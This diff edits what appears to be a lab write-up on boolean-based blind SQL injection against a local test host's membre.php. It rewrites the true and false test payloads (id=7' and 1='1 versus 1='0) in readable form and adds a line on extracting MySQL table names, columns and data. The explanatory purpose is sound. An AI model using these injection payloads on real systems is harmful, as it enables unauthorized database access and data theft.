@@ -16,8 +16,10 @@
 An url is vulnerable to this exploit if:
 
 * Normal request `http://172.28.128.3:8007/membre.php?id=7` returns results
-* Request `http://172.28.128.3:8007/membre.php?id=7%27%20and%201=%271` also
+* Request `http://172.28.128.3:8007/membre.php?id=7' and 1='1` also
   returns results.
-* But request `http://172.28.128.3:8007/membre.php?id=7%27%20and%201=%270`
+* But request `http://172.28.128.3:8007/membre.php?id=7' and 1='0`
   doesn't return any results.
 
+This allows us to ask many yes/no questions to MySQL, and figure out table
+names, columns names and data.
